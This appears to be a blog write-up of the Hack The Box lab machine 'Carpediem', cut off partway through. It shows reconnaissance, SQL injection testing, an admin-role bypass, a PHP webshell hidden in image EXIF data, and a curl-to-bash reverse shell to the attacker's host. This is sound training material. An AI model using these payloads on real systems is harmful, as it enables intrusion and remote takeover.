@@ -1,0 +1,1416 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en"><head>
+
+<meta charset="utf-8">
+<meta name="generator" content="quarto-1.5.45">
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+
+<meta name="author" content="0xPThree">
+<meta name="dcterms.date" content="2022-09-14">
+<meta name="description" content="Carpediem is a hard-rated Linux machine from Hack The Box and probably one of the best, if not even the best, box I’ve done. This is a HUGE box with a lot of different containers and feels very real world. We have to pivot left and right, enumerate a lot and probably do 3-4 privilege escalations before we’re finally root. Because of the big scope this box took me a few days to complete and I got stuck on several places along the way. The path to user was very fun and even incorporates VoIP as a vector, path to root introduced me to a new docker escape that was amazing - I can’t wait to try it out in the real world! If you haven’t done this box yet, make sure that you try it out.">
+
+<title>Carpediem - Hack The Box</title>
+<style>
+code{white-space: pre-wrap;}
+span.smallcaps{font-variant: small-caps;}
+div.columns{display: flex; gap: min(4vw, 1.5em);}
+div.column{flex: auto; overflow-x: auto;}
+div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
+ul.task-list{list-style: none;}
+ul.task-list li input[type="checkbox"] {
+  width: 0.8em;
+  margin: 0 0.8em 0.2em -1em; /* quarto-specific, see https://github.com/quarto-dev/quarto-cli/issues/4556 */ 
+  vertical-align: middle;
+}
+/* CSS for syntax highlighting */
+pre > code.sourceCode { white-space: pre; position: relative; }
+pre > code.sourceCode > span { line-height: 1.25; }
+pre > code.sourceCode > span:empty { height: 1.2em; }
+.sourceCode { overflow: visible; }
+code.sourceCode > span { color: inherit; text-decoration: inherit; }
+div.sourceCode { margin: 1em 0; }
+pre.sourceCode { margin: 0; }
+@media screen {
+div.sourceCode { overflow: auto; }
+}
+@media print {
+pre > code.sourceCode { white-space: pre-wrap; }
+pre > code.sourceCode > span { display: inline-block; text-indent: -5em; padding-left: 5em; }
+}
+pre.numberSource code
+  { counter-reset: source-line 0; }
+pre.numberSource code > span
+  { position: relative; left: -4em; counter-increment: source-line; }
+pre.numberSource code > span > a:first-child::before
+  { content: counter(source-line);
+    position: relative; left: -1em; text-align: right; vertical-align: baseline;
+    border: none; display: inline-block;
+    -webkit-touch-callout: none; -webkit-user-select: none;
+    -khtml-user-select: none; -moz-user-select: none;
+    -ms-user-select: none; user-select: none;
+    padding: 0 4px; width: 4em;
+  }
+pre.numberSource { margin-left: 3em;  padding-left: 4px; }
+div.sourceCode
+  {   }
+@media screen {
+pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
+}
+</style>
+
+
+<script src="../../site_libs/quarto-nav/quarto-nav.js"></script>
+<script src="../../site_libs/quarto-nav/headroom.min.js"></script>
+<script src="../../site_libs/clipboard/clipboard.min.js"></script>
+<script src="../../site_libs/quarto-search/autocomplete.umd.js"></script>
+<script src="../../site_libs/quarto-search/fuse.min.js"></script>
+<script src="../../site_libs/quarto-search/quarto-search.js"></script>
+<meta name="quarto:offset" content="../../">
+<link href="../../favicon.ico" rel="icon">
+<script src="../../site_libs/quarto-html/quarto.js"></script>
+<script src="../../site_libs/quarto-html/popper.min.js"></script>
+<script src="../../site_libs/quarto-html/tippy.umd.min.js"></script>
+<script src="../../site_libs/quarto-html/anchor.min.js"></script>
+<link href="../../site_libs/quarto-html/tippy.css" rel="stylesheet">
+<link href="../../site_libs/quarto-html/quarto-syntax-highlighting.css" rel="stylesheet" id="quarto-text-highlighting-styles">
+<script src="../../site_libs/bootstrap/bootstrap.min.js"></script>
+<link href="../../site_libs/bootstrap/bootstrap-icons.css" rel="stylesheet">
+<link href="../../site_libs/bootstrap/bootstrap.min.css" rel="stylesheet" id="quarto-bootstrap" data-mode="light">
+<script id="quarto-search-options" type="application/json">{
+  "location": "navbar",
+  "copy-button": false,
+  "collapse-after": 3,
+  "panel-placement": "end",
+  "type": "overlay",
+  "limit": 50,
+  "keyboard-shortcut": [
+    "f",
+    "/",
+    "s"
+  ],
+  "show-item-context": false,
+  "language": {
+    "search-no-results-text": "No results",
+    "search-matching-documents-text": "matching documents",
+    "search-copy-link-title": "Copy link to search",
+    "search-hide-matches-text": "Hide additional matches",
+    "search-more-match-text": "more match in this document",
+    "search-more-matches-text": "more matches in this document",
+    "search-clear-button-title": "Clear",
+    "search-text-placeholder": "",
+    "search-detached-cancel-button-title": "Cancel",
+    "search-submit-button-title": "Submit",
+    "search-label": "Search"
+  }
+}</script>
+<script async="" src="https://www.googletagmanager.com/gtag/js?id=G-XVW5CQ7DG5"></script>
+
+<script type="text/javascript">
+
+window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', 'G-XVW5CQ7DG5', { 'anonymize_ip': true});
+</script>
+
+
+<link rel="stylesheet" href="../../scss/styles.css">
+<link rel="stylesheet" href="../../scss/bootstrap-dark.min.css">
+<link rel="stylesheet" href="../../scss/quarto-syntax-highlighting-dark.css">
+<link rel="stylesheet" href="../../scss/bootstrap-icons.css">
+</head>
+
+<body class="nav-fixed">
+
+<div id="quarto-search-results"></div>
+  <header id="quarto-header" class="headroom fixed-top quarto-banner">
+    <nav class="navbar navbar-expand-lg " data-bs-theme="dark">
+      <div class="navbar-container container-fluid">
+      <div class="navbar-brand-container mx-auto">
+    <a href="../../index.html" class="navbar-brand navbar-brand-logo">
+    <img src="../../static/exploit_white-orange.png" alt="" class="navbar-logo">
+    </a>
+  </div>
+            <div id="quarto-search" class="" title="Search"></div>
+          <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarCollapse" aria-controls="navbarCollapse" role="menu" aria-expanded="false" aria-label="Toggle navigation" onclick="if (window.quartoToggleHeadroom) { window.quartoToggleHeadroom(); }">
+  <span class="navbar-toggler-icon"></span>
+</button>
+          <div class="collapse navbar-collapse" id="navbarCollapse">
+            <ul class="navbar-nav navbar-nav-scroll ms-auto">
+  <li class="nav-item">
+    <a class="nav-link" href="../../index.html"> 
+<span class="menu-text">Home</span></a>
+  </li>  
+  <li class="nav-item">
+    <a class="nav-link" href="https://0xpthree.gitbook.io/notes"> 
+<span class="menu-text">Notes</span></a>
+  </li>  
+  <li class="nav-item">
+    <a class="nav-link" href="../../about.html"> 
+<span class="menu-text">About</span></a>
+  </li>  
+</ul>
+          </div> <!-- /navcollapse -->
+            <div class="quarto-navbar-tools">
+</div>
+      </div> <!-- /container-fluid -->
+    </nav>
+</header>
+<!-- content -->
+<header id="title-block-header" class="quarto-title-block default page-columns page-full">
+  <div class="quarto-title-banner page-columns page-full">
+    <div class="quarto-title column-body">
+      <h1 class="title">Carpediem - Hack The Box</h1>
+                  <div>
+        <div class="description">
+          Carpediem is a hard-rated Linux machine from Hack The Box and probably one of the best, if not even the best, box I’ve done. This is a HUGE box with a lot of different containers and feels very real world. We have to pivot left and right, enumerate a lot and probably do 3-4 privilege escalations before we’re finally root. Because of the big scope this box took me a few days to complete and I got stuck on several places along the way. The path to user was very fun and even incorporates VoIP as a vector, path to root introduced me to a new docker escape that was amazing - I can’t wait to try it out in the real world! If you haven’t done this box yet, make sure that you try it out.
+        </div>
+      </div>
+                          <div class="quarto-categories">
+                <div class="quarto-category">hackthebox</div>
+                <div class="quarto-category">linux</div>
+                <div class="quarto-category">web</div>
+                <div class="quarto-category">docker</div>
+                <div class="quarto-category">tunneling</div>
+                <div class="quarto-category">pivot</div>
+                <div class="quarto-category">mongodb</div>
+                <div class="quarto-category">void</div>
+                <div class="quarto-category">pcap</div>
+                <div class="quarto-category">release_agent</div>
+              </div>
+                  </div>
+  </div>
+    
+  
+  <div class="quarto-title-meta">
+
+      <div>
+      <div class="quarto-title-meta-heading">Author</div>
+      <div class="quarto-title-meta-contents">
+               <p>0xPThree </p>
+            </div>
+    </div>
+      
+      <div>
+      <div class="quarto-title-meta-heading">Published</div>
+      <div class="quarto-title-meta-contents">
+        <p class="date">September 14, 2022</p>
+      </div>
+    </div>
+    
+      
+    </div>
+    
+  
+  </header><div id="quarto-content" class="quarto-container page-columns page-rows-contents page-layout-article page-navbar">
+<!-- sidebar -->
+<!-- margin-sidebar -->
+    <div id="quarto-margin-sidebar" class="sidebar margin-sidebar">
+        <nav id="TOC" role="doc-toc" class="toc-active">
+    <h2 id="toc-title">On this page</h2>
+   
+  <ul>
+  <li><a href="#user" id="toc-user" class="nav-link active" data-scroll-target="#user">USER</a>
+  <ul class="collapse">
+  <li><a href="#step-1" id="toc-step-1" class="nav-link" data-scroll-target="#step-1">Step 1</a></li>
+  <li><a href="#step-2" id="toc-step-2" class="nav-link" data-scroll-target="#step-2">Step 2</a></li>
+  <li><a href="#step-3" id="toc-step-3" class="nav-link" data-scroll-target="#step-3">Step 3</a></li>
+  <li><a href="#step-4" id="toc-step-4" class="nav-link" data-scroll-target="#step-4">Step 4</a></li>
+  <li><a href="#step-5" id="toc-step-5" class="nav-link" data-scroll-target="#step-5">Step 5</a></li>
+  <li><a href="#step-6" id="toc-step-6" class="nav-link" data-scroll-target="#step-6">Step 6</a></li>
+  </ul></li>
+  <li><a href="#root" id="toc-root" class="nav-link" data-scroll-target="#root">ROOT</a>
+  <ul class="collapse">
+  <li><a href="#step-1-1" id="toc-step-1-1" class="nav-link" data-scroll-target="#step-1-1">Step 1</a></li>
+  <li><a href="#step-2-1" id="toc-step-2-1" class="nav-link" data-scroll-target="#step-2-1">Step 2</a></li>
+  <li><a href="#step-3-1" id="toc-step-3-1" class="nav-link" data-scroll-target="#step-3-1">Step 3</a></li>
+  <li><a href="#step-4-1" id="toc-step-4-1" class="nav-link" data-scroll-target="#step-4-1">Step 4</a></li>
+  </ul></li>
+  </ul>
+</nav>
+    </div>
+<!-- main -->
+<main class="content quarto-banner-title-block" id="quarto-document-content">
+
+
+
+
+
+<section id="user" class="level1">
+<h1>USER</h1>
+<section id="step-1" class="level3">
+<h3 class="anchored" data-anchor-id="step-1">Step 1</h3>
+<div class="sourceCode" id="cb1"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  carpediem nmap <span class="at">-Pn</span> <span class="at">-n</span> <span class="at">-p-</span> 10.10.11.167</span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a><span class="ex">PORT</span>   STATE SERVICE</span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a><span class="ex">22/tcp</span> open  ssh</span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a><span class="ex">80/tcp</span> open  http</span>
+<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-7"><a href="#cb1-7" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  carpediem nmap <span class="at">-Pn</span> <span class="at">-n</span> <span class="at">-p22,80</span> <span class="at">-sCV</span> 10.10.11.167</span>
+<span id="cb1-8"><a href="#cb1-8" aria-hidden="true" tabindex="-1"></a><span class="ex">PORT</span>   STATE SERVICE VERSION</span>
+<span id="cb1-9"><a href="#cb1-9" aria-hidden="true" tabindex="-1"></a><span class="ex">22/tcp</span> open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span class="er">(</span><span class="ex">Ubuntu</span> Linux<span class="kw">;</span> <span class="ex">protocol</span> 2.0<span class="kw">)</span></span>
+<span id="cb1-10"><a href="#cb1-10" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">ssh-hostkey:</span> </span>
+<span id="cb1-11"><a href="#cb1-11" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span>   <span class="ex">3072</span> 96:21:76:f7:2d:c5:f0:4e:e0:a8:df:b4:d9:5e:45:26 <span class="er">(</span><span class="ex">RSA</span><span class="kw">)</span></span>
+<span id="cb1-12"><a href="#cb1-12" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span>   <span class="ex">256</span> b1:6d:e3:fa:da:10:b9:7b:9e:57:53:5c:5b:b7:60:06 <span class="er">(</span><span class="ex">ECDSA</span><span class="kw">)</span></span>
+<span id="cb1-13"><a href="#cb1-13" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_</span>  256 6a:16:96:d8:05:29:d5:90:bf:6b:2a:09:32:dc:36:4f <span class="er">(</span><span class="ex">ED25519</span><span class="kw">)</span></span>
+<span id="cb1-14"><a href="#cb1-14" aria-hidden="true" tabindex="-1"></a><span class="ex">80/tcp</span> open  http    nginx 1.18.0 <span class="er">(</span><span class="ex">Ubuntu</span><span class="kw">)</span></span>
+<span id="cb1-15"><a href="#cb1-15" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_http-server-header:</span> nginx/1.18.0 <span class="er">(</span><span class="ex">Ubuntu</span><span class="kw">)</span></span>
+<span id="cb1-16"><a href="#cb1-16" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_http-title:</span> Comming Soon</span>
+<span id="cb1-17"><a href="#cb1-17" aria-hidden="true" tabindex="-1"></a><span class="ex">Service</span> Info: OS: Linux<span class="kw">;</span> <span class="ex">CPE:</span> cpe:/o:linux:linux_kernel</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<div class="sourceCode" id="cb2"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  webanalyze ./webanalyze <span class="at">-host</span> http://10.10.11.167</span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a><span class="ex">http://10.10.11.167</span> <span class="er">(</span><span class="ex">0.2s</span><span class="kw">)</span><span class="bu">:</span></span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Bootstrap,</span>  <span class="er">(</span><span class="ex">UI</span> frameworks<span class="kw">)</span></span>
+<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Google</span> Font API,  <span class="er">(</span><span class="ex">Font</span> scripts<span class="kw">)</span></span>
+<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Ubuntu,</span>  <span class="er">(</span><span class="ex">Operating</span> systems<span class="kw">)</span></span>
+<span id="cb2-6"><a href="#cb2-6" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Nginx,</span> 1.18.0 <span class="er">(</span><span class="ex">Web</span> servers, Reverse proxies<span class="kw">)</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>Visiting <code>http://10.10.11.167</code> we find the domain <code>carpediem.htb</code> and a release count down, similar to the box <em>Player</em>. <img src="images/carpediem01.png" class="img-fluid"></p>
+<p>Looking for vhosts we find <code>portal.carpediem.htb</code>:</p>
+<div class="sourceCode" id="cb3"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  carpediem ffuf <span class="at">-c</span> <span class="at">-w</span> /usr/share/wordlists/dirb/big.txt <span class="at">-u</span> http://carpediem.htb <span class="at">-H</span> <span class="st">"Host: FUZZ.carpediem.htb"</span> <span class="at">-fs</span> 2875</span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="ex">portal</span>                  [Status: 200, Size: 31090, Words: 7687, Lines: 463, Duration: 104ms]</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p><code>http://portal.carpediem.htb</code> is a unexpected motorcycle shop. <img src="images/carpediem02.png" class="img-fluid"></p>
+<p>Looking around on the <code>portal</code> page we have a lot of parameters to fuzz, starting with <code>search</code> I find nothing. Next moving on to <code>?p=</code> I’m able to create a loop which will exhaust the memory revealing the directory location: <img src="images/carpediem03.png" class="img-fluid"></p>
+<p>Testing any other of the found parameters, example <code>uploads</code>, we get this message:</p>
+<div class="sourceCode" id="cb4"><pre class="sourceCode php code-with-copy"><code class="sourceCode php"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a>Warning<span class="ot">:</span> <span class="kw">include</span>(uploads<span class="op">/</span>index<span class="op">.</span>php)<span class="ot">:</span> failed to open stream<span class="ot">:</span> No such <span class="fu">file</span> <span class="op">or</span> <span class="bu">directory</span> in <span class="op">/</span><span class="kw">var</span><span class="op">/</span>www<span class="op">/</span>html<span class="op">/</span>portal<span class="op">/</span>index<span class="op">.</span>php on line <span class="dv">14</span></span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a>Warning<span class="ot">:</span> <span class="kw">include</span>()<span class="ot">:</span> Failed opening <span class="st">'uploads/index.php'</span> <span class="cf">for</span> inclusion (include_path<span class="op">=</span><span class="st">'.:/usr/local/lib/php'</span>) in <span class="op">/</span><span class="kw">var</span><span class="op">/</span>www<span class="op">/</span>html<span class="op">/</span>portal<span class="op">/</span>index<span class="op">.</span>php on line <span class="dv">14</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>I’m unable to do anything of use with this information, so lets move on.</p>
+<div class="sourceCode" id="cb5"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  carpediem ffuf <span class="at">-c</span> <span class="at">-w</span> /usr/share/wordlists/dirb/big.txt <span class="at">-u</span> http://portal.carpediem.htb/FUZZ/</span>
+<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a><span class="ex">.htaccess</span>               [Status: 403, Size: 285, Words: 20, Lines: 10, Duration: 71ms]</span>
+<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a><span class="ex">.htpasswd</span>               [Status: 403, Size: 285, Words: 20, Lines: 10, Duration: 75ms]</span>
+<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a><span class="ex">admin</span>                   [Status: 200, Size: 27834, Words: 7052, Lines: 567, Duration: 89ms]</span>
+<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a><span class="ex">assets</span>                  [Status: 403, Size: 285, Words: 20, Lines: 10, Duration: 63ms]</span>
+<span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a><span class="ex">build</span>                   [Status: 403, Size: 285, Words: 20, Lines: 10, Duration: 66ms]</span>
+<span id="cb5-7"><a href="#cb5-7" aria-hidden="true" tabindex="-1"></a><span class="ex">classes</span>                 [Status: 403, Size: 285, Words: 20, Lines: 10, Duration: 55ms]</span>
+<span id="cb5-8"><a href="#cb5-8" aria-hidden="true" tabindex="-1"></a><span class="ex">dist</span>                    [Status: 403, Size: 285, Words: 20, Lines: 10, Duration: 64ms]</span>
+<span id="cb5-9"><a href="#cb5-9" aria-hidden="true" tabindex="-1"></a><span class="ex">icons</span>                   [Status: 403, Size: 285, Words: 20, Lines: 10, Duration: 65ms]</span>
+<span id="cb5-10"><a href="#cb5-10" aria-hidden="true" tabindex="-1"></a><span class="ex">inc</span>                     [Status: 403, Size: 285, Words: 20, Lines: 10, Duration: 65ms]</span>
+<span id="cb5-11"><a href="#cb5-11" aria-hidden="true" tabindex="-1"></a><span class="ex">libs</span>                    [Status: 403, Size: 285, Words: 20, Lines: 10, Duration: 63ms]</span>
+<span id="cb5-12"><a href="#cb5-12" aria-hidden="true" tabindex="-1"></a><span class="ex">plugins</span>                 [Status: 403, Size: 285, Words: 20, Lines: 10, Duration: 41ms]</span>
+<span id="cb5-13"><a href="#cb5-13" aria-hidden="true" tabindex="-1"></a><span class="ex">server-status</span>           [Status: 403, Size: 285, Words: 20, Lines: 10, Duration: 68ms]</span>
+<span id="cb5-14"><a href="#cb5-14" aria-hidden="true" tabindex="-1"></a><span class="ex">uploads</span>                 [Status: 403, Size: 285, Words: 20, Lines: 10, Duration: 63ms]</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>Browsing to <code>/admin</code> we get a alert saying <code>Access Denied!</code>, trying to register a user account and testing again result in the same thing.</p>
+<p>Playing around with the register function we can confirm that there is a user called <code>admin</code>: <img src="images/carpediem04.png" class="img-fluid"></p>
+<p>We’re able to break the SQL syntax by entering username <code>'ORDER BY 1--</code>: <img src="images/carpediem05.png" class="img-fluid"></p>
+<p>Save the request to a file and fire up <code>sqlmap</code> to do the heavy lifting for you.</p>
+<div class="sourceCode" id="cb6"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  carpediem sqlmap <span class="at">-r</span> register.req <span class="at">-p</span> username</span>
+<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a><span class="ex">[...</span> snip ...]</span>
+<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a><span class="ex">[12:35:21]</span> <span class="pp">[</span><span class="ss">INFO</span><span class="pp">]</span> POST parameter <span class="st">'username'</span> is <span class="st">'MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'</span> injectable</span>
+<span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a><span class="ex">sqlmap</span> identified the following injection point<span class="er">(</span><span class="ex">s</span><span class="kw">)</span> <span class="ex">with</span> a total of 996 HTTP<span class="er">(</span><span class="ex">s</span><span class="kw">)</span> <span class="ex">requests:</span></span>
+<span id="cb6-5"><a href="#cb6-5" aria-hidden="true" tabindex="-1"></a><span class="ex">---</span></span>
+<span id="cb6-6"><a href="#cb6-6" aria-hidden="true" tabindex="-1"></a><span class="ex">Parameter:</span> username <span class="er">(</span><span class="ex">POST</span><span class="kw">)</span></span>
+<span id="cb6-7"><a href="#cb6-7" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Type:</span> error-based</span>
+<span id="cb6-8"><a href="#cb6-8" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Title:</span> MySQL <span class="op">&gt;</span>= 5.6 AND error-based <span class="at">-</span> WHERE, HAVING, ORDER BY or GROUP BY clause <span class="er">(</span><span class="ex">GTID_SUBSET</span><span class="kw">)</span></span>
+<span id="cb6-9"><a href="#cb6-9" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Payload:</span> firstname=asdf<span class="kw">&amp;</span><span class="va">lastname</span><span class="op">=</span>asdf<span class="kw">&amp;</span><span class="va">contact</span><span class="op">=</span>asdf<span class="kw">&amp;</span><span class="va">gender</span><span class="op">=</span>Male<span class="kw">&amp;</span><span class="va">address</span><span class="op">=</span>asdf<span class="kw">&amp;</span><span class="va">username</span><span class="op">=</span>injectpls<span class="st">'||(SELECT 0x62626476 WHERE 4087=4087 AND GTID_SUBSET(CONCAT(0x7178627671,(SELECT (ELT(5583=5583,1))),0x71707a7a71),5583))||'</span><span class="kw">&amp;</span><span class="va">password</span><span class="op">=</span>asdf</span>
+<span id="cb6-10"><a href="#cb6-10" aria-hidden="true" tabindex="-1"></a><span class="ex">---</span></span>
+<span id="cb6-11"><a href="#cb6-11" aria-hidden="true" tabindex="-1"></a><span class="ex">[12:35:35]</span> <span class="pp">[</span><span class="ss">INFO</span><span class="pp">]</span> the back-end DBMS is MySQL</span>
+<span id="cb6-12"><a href="#cb6-12" aria-hidden="true" tabindex="-1"></a><span class="ex">web</span> server operating system: Linux Ubuntu</span>
+<span id="cb6-13"><a href="#cb6-13" aria-hidden="true" tabindex="-1"></a><span class="ex">web</span> application technology: PHP 7.4.25, Nginx 1.18.0</span>
+<span id="cb6-14"><a href="#cb6-14" aria-hidden="true" tabindex="-1"></a><span class="ex">back-end</span> DBMS: MySQL <span class="op">&gt;</span>= 5.6</span>
+<span id="cb6-15"><a href="#cb6-15" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-16"><a href="#cb6-16" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  carpediem sqlmap <span class="at">-r</span> register.req <span class="at">-p</span> username <span class="at">--dbs</span></span>
+<span id="cb6-17"><a href="#cb6-17" aria-hidden="true" tabindex="-1"></a><span class="ex">available</span> databases <span class="pp">[</span><span class="ss">1</span><span class="pp">]</span>:</span>
+<span id="cb6-18"><a href="#cb6-18" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> portal</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>Sadly it stops there, we’re unable to fetch tables and/or columns. I tried a lot of different common combinations such as table <code>users</code> and columns <code>username,password</code> but nothing. It looks like this might be a rabbit hole. Moving on to the next form, we can edit our user under <code>http://portal.carpediem.htb/?p=edit_account</code>.</p>
+<p>Doing a edit, we can see a new interesting parameter in Burp - <code>login_type=2</code>. Changing this to <strong>1</strong> and we’re now able to access <code>/admin</code> <img src="images/carpediem06.png" class="img-fluid"></p>
+<p><img src="images/carpediem07.png" class="img-fluid"></p>
+</section>
+<section id="step-2" class="level3">
+<h3 class="anchored" data-anchor-id="step-2">Step 2</h3>
+<p>Going through the admin panel the options are slim, at first glance it looks like we have a lot of options but in reality they’ve removed all the <em>update/save</em> buttons only giving access to few functions.</p>
+<p><strong>(1)</strong> We can create a new bike with text + image<br> <strong>(2)</strong> Edit previously created bikes<br> <strong>(3)</strong> Print a Booking Report PDF<br> <strong>(4)</strong> Edit our user profile and add avatar image<br></p>
+<p>Looking on bookings we find 5 entries, and from the data a new name: <code>jhammond@carpediem.htb</code>. Going to edit user profile I try to upload a malicious jpg containing php code, but this does nothing.</p>
+<p>We can bypass this by simply capturing the request in burp and removing <code>.jpg</code> from the request body, and the file will be uploaded as a <code>.php</code>.</p>
+<div class="sourceCode" id="cb7"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  carpediem exiftool <span class="at">-DocumentName</span><span class="op">=</span><span class="st">"&lt;h1&gt;0xPThree - exploit.se&lt;br&gt;&lt;?php if(isset(</span><span class="dt">\$</span><span class="st">_REQUEST['cmd'])){echo '&lt;pre&gt;';</span><span class="dt">\$</span><span class="st">cmd = (</span><span class="dt">\$</span><span class="st">_REQUEST['cmd']);system(</span><span class="dt">\$</span><span class="st">cmd);echo '&lt;/pre&gt;';} __halt_compiler();?&gt;&lt;/h1&gt;"</span> exploit.jpg </span>
+<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a>    <span class="ex">1</span> image files updated</span>
+<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  carpediem mv exploit.jpg exploit.php.jpg</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>From Burp intercept change filename:<br> <img src="images/carpediem08.png" class="img-fluid"></p>
+<p>And our avatar should now be broken by the webshell.<br> <img src="images/carpediem09.png" class="img-fluid"></p>
+<p>Right-click the image, open in new tab, and start to enumerate the box and/or setup a reverse shell. <br> <img src="images/carpediem10.png" class="img-fluid"></p>
+<p>The uploaded php file is removed after a few minutes, so create a simple reverse shell:</p>
+<div class="sourceCode" id="cb8"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  carpediem echo <span class="st">"bash -i &gt;&amp; /dev/tcp/10.10.14.10/4488 0&gt;&amp;1"</span> <span class="op">&gt;</span> rev.sh</span>
+<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  carpediem chmod +x rev.sh </span>
+<span id="cb8-3"><a href="#cb8-3" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  carpediem python3 <span class="at">-m</span> http.server 80</span>
+<span id="cb8-4"><a href="#cb8-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb8-5"><a href="#cb8-5" aria-hidden="true" tabindex="-1"></a><span class="co">## Do a GET request to run 'rev.sh'</span></span>
+<span id="cb8-6"><a href="#cb8-6" aria-hidden="true" tabindex="-1"></a><span class="ex">GET</span> /uploads/1662983460_exploit.php<span class="pp">?</span>cmd=curl%20http://10.10.14.10/rev.sh<span class="kw">|</span><span class="fu">bash</span></span>
+<span id="cb8-7"><a href="#cb8-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb8-8"><a href="#cb8-8" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  carpediem nc <span class="at">-lvnp</span> 4488</span>
+<span id="cb8-9"><a href="#cb8-9" aria-hidden="true" tabindex="-1"></a><span class="ex">listening</span> on <span class="pp">[</span><span class="ss">any</span><span class="pp">]</span> 4488 ...</span>
+<span id="cb8-10"><a href="#cb8-10" aria-hidden="true" tabindex="-1"></a><span class="ex">connect</span> to <span class="pp">[</span><span class="ss">10.10.14.10</span><span class="pp">]</span> from <span class="er">(</span><span class="ex">UNKNOWN</span><span class="kw">)</span> <span class="ex">[10.10.11.167]</span> 46968</span>
+<span id="cb8-11"><a href="#cb8-11" aria-hidden="true" tabindex="-1"></a><span class="ex">bash:</span> cannot set terminal process group <span class="er">(</span><span class="ex">1</span><span class="kw">)</span><span class="bu">:</span> Inappropriate ioctl for device</span>
+<span id="cb8-12"><a href="#cb8-12" aria-hidden="true" tabindex="-1"></a><span class="ex">bash:</span> no job control in this shell</span>
